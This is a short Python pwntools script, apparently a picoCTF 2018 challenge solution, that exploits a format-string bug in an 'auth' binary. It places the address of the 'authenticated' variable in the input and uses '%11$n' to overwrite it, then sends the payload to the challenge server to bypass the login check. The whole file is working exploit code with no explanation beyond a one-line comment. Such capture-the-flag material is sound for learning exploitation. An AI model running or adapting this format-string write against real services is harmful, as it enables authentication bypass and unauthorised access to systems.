#!/usr/bin/python2
from pwn import *

# This is format-string attack

def getProcess():
    is_remote = True
    if is_remote:
        return remote('2018shell1.picoctf.com', 52918)
    else:
        return process('../auth')

elf = ELF('../auth')
p = getProcess()
p.recvline()

payload  = p32(elf.symbols['authenticated'])
payload += "%11$n"
p.sendline(payload)

print (p.recvall())